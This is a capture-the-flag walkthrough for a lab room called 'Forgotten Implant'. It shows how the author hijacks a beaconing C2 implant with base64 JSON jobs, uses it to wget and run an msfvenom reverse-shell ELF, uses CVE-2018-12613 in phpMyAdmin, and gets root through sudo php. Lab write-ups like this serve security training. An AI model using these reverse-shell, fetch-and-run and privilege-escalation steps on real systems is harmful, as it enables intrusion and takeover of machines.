# Room: Forgotton Implant
> #### Difficulty: Medium
<i>With almost no attack surface, you must use a forgotten C2 implant to get initial access.</i>
### Description

<blockquote>
Welcome to Forgotten Implant! 

This is a pretty straightforward CTF-like room in which you will have to get initial access before elevating your privileges. The initial attack surface is quite limited, and you'll have to find a way of interacting with the system.

If you have no prior knowledge of Command and Control (C2), you might want to look at the Intro to C2 room. While it is not necessary to solve this challenge, it will provide valuable context for your learning experience.

Please allow 3-5 minutes for the VM to boot properly!

Note: While being very linear, this room can be solved in various ways. To get the most out of it, feel free to overengineer your solution to your liking!
</blockquote>

#### What To Do:
Step 1:
###### Do a simple nmap scan(port scan).
```
nmap <target-ip>
```
###### Output:
```
Nmap scan report for 10.10.59.154
Host is up (0.17s latency).
All 1000 scanned ports on 10.10.59.154 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
```
###### Wow🤨 no ports. Ok now lets do another nmap scan, its probably blocking ping scans.
```
nmap -Pn <target-ip>
```
###### What the... 👀 Still no common open portss?? Lets run wireshark to see the responses from nmap while scanning otherwise we going to waste our time.
```
nmap <target-ip>
```
###### Wireshark Result:
![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/05a19a2d-4ea8-421c-832d-99d164fd7b00)
###### Interesting😲... No RST packet on port 81, but there is just a SYN packet, Trying to make a Connection to my machine😕?? Is that how C2C(command and control) is used😕??
###### I actually went to go research abit out C2C or C2 after this to get its functioning. I concluded it was somewhat like a backdoor where I could possibly give it commands or some status it requires/requests.
###### Lets try to run a simple HTTP server on port 81
```
sudo python3 -m http.server 81
```
###### Wow, we see Some Interesting things.
```
10.10.59.154 - - [01/Aug/2023 09:41:03] code 404, message File not found
10.10.59.154 - - [01/Aug/2023 09:41:03] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDFUMDc6NDE6MDIuMzc3MTE5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -
10.10.59.154 - - [01/Aug/2023 09:41:05] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
10.10.59.154 - - [01/Aug/2023 09:41:05] code 404, message File not found
```
###### It looks like its requesting base64 encoded files, Lets try to decode it and make out what it says.
```
echo 'eyJ0aW1lIjogIjIwMjMtMDgtMDFUMDc6NDE6MDIuMzc3MTE5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9' | base64 -d
```
```
echo 'ImxhdGVzdCI=' | base64 -d 
```
###### Output:
```
{"time": "2023-08-01T07:41:02.377119", "systeminfo": {"os": "Linux", "hostname": "forgottenimplant"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}
```
```
"latest"
```
###### Interesting😲...

Step 2:
###### Inorder to get foothold we have to understand abit about Json encoding and abit about HTTP request headers. As in the previous step we can see the C2 is sending a HTTP request to us using the method GET. The below is one of them.
```
GET /get-job/ImxhdGVzdCI= HTTP/1.1
```
###### What you want to do is, create a folder with that base64 names file in it and in the file the contents should be a job since its requesting in folder "/get-job/"
```
mkdir ./get-job/
```
```
touch 'get-job/ImxhdGVzdCI='
```
###### Now what you want to do is, send it a json response giving it a job👷‍♂️.
```
echo '{"job_id": 0, "cmd": "whoami"}' > get-job/ImxhdGVzdCI=
```
###### Now run the server(make sure you not in the get-job folder otherwise your server will give respond with 404).
```
sudo python3 -m http.server 81
```
###### Output:
```
...
10.10.59.154 - - [01/Aug/2023 10:09:05] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 -
```
###### Decode the base64👷‍♂️.<br>Output:
```
{"success": false, "result": "Encoding error"}
```
###### Wow😲. It will probably make sense to respond back in base64, lets try.
```
echo $(cat 'get-job/ImxhdGVzdCI=' | base64) > 'get-job/ImxhdGVzdCI='
```
###### Restart the server for clarity and wait for it to request.<br>Output:
```
10.10.59.154 - - [01/Aug/2023 10:20:04] "GET /job-result/eyJqb2JfaWQiOiAwLCAiY21kIjogIndob2FtaSIsICJzdWNjZXNzIjogdHJ1ZSwgInJlc3VsdCI6ICJhZGFcbiJ9 HTTP/1.1" 404 -
```
######  Decode Base64.<br>Output:
```
{"job_id": 0, "cmd": "whoami", "success": true, "result": "ada\n"}
```
###### Congratulations🥳, You have Achieved foothold!!!

Step 3:
###### Now you probably guess what we going to do next. You probably tried a "/bin/bash" reverse shell and saw that it was being closed after the connection was made. But dont give up there are many more reverse shells out there to try. The one I used was from "msfvenom" as showen below.
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f elf > shell.elf
```
###### Once that is done, you run a command on the target machine using the c2 to "Download", "Set Execution Bit" and then run the shell.elf.
```
echo '{"job_id": 0, "cmd": "wget http://<your-ip>:<your-port>/shell.elf"}' | base64 > 'get-job/ImxhdGVzdCI='
```
###### Make it executable.
```
echo '{"job_id": 0, "cmd": "chmod +x shell.elf"}' | base64 > 'get-job/ImxhdGVzdCI='
```
###### Run a netcat listener.
```
nc -nvlp <your-revshell-port>
```
###### Run the shell.elf.
```
echo '{"job_id": 0, "cmd": "./shell.elf"}' | base64 > 'get-job/ImxhdGVzdCI='
```
###### Wait🐌....
###### Niceee 😜
![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/19faba52-9617-46d8-83aa-8e05c85648ee)
###### Lets get a neat shell
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```
![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/5c6be3d0-b480-4ba9-bc7a-28d89c610e10)


Step 4:
###### Before you go continue with this write-up try and find your own way to privesc. If you really start to bang your head and haven't gotten to far then come back.
## A Few Moments Later ....
###### Ok so to do PrivEsc you probably found the following.<br>open ports mysql(3306, 33060), http(80)<br>/var/www/html, /var/www/phpmyadmin<br>/etc/passwd contains users(ada, fi, root)<br>/home/ada has 2 scripts products.py(has the creds for mysql) and .implant/implant.py<br>/home/fi/ has sanitize.sh and sniffer.py<br>And you will notice both directories have log files.
###### Now the interesting thing "sanitize.sh" is used only by root to clear logs and in /var/www/phpmyadmin you find db_sql.php which you notice is vulnerable to LFI.<br>You might think to yourself why....<br>If you pursue this LFI you get a RCE by poisoning the session cookie.<br>I dont know where exactly the verson of the phpmyadmin is but I portforwarded it and got a buggy version of the website in my browser and I logged in using the credentials I found. It Worked. I also found a CVE for the php application (CVE-2018-12613). Download it it helps alot for this next part.

###### So we need to download the exploit onto out machine and then from our machine onto the targets machine. The following is to let the target download the exploit.
```
echo '{"job_id": 0, "cmd": "wget http://<your-ip>:<your-port>/exploit.py"}' | base64 > 'get-job/ImxhdGVzdCI='\
```
###### Listen on the port you have set your shell.elf to, to create a new session.
```
nc -nvlp <your-port>
```
###### Make sure the old shell is not running on the target.
```
echo '{"job_id": 0, "cmd": "pkill shell.elf"}' | base64 > 'get-job/ImxhdGVzdCI='\
```
###### Use it to run shell.elf
```
echo '{"job_id": 0, "cmd": "python3 exploit.py localhost 80 '"'""'"' <mysql-username> <mysql-password> /home/ada/shell.elf"}' | base64 > 'get-job/ImxhdGVzdCI='\
```
###### Nice😉
![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/2a7db0b1-fda7-456d-8219-e5f987006b0b)

Step 5:
###### Lets try our luck with running.
```
sudo -l
```
###### 👀😲Whatttt..<br>Output:
```
Matching Defaults entries for www-data on forgottenimplant:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on forgottenimplant:
    (root) NOPASSWD: /usr/bin/php
```
###### There are so many ways to get root with php. What I used is showen below.
```
sudo php -r "system('/bin/bash');"
```
![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/19e05a9b-2486-48b3-bb61-4f7ed3f4c7f6)
###### And you finally Got ROOOTTT🥳🕶️
![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/283109ac-d754-4482-a887-05c3da4c1241)








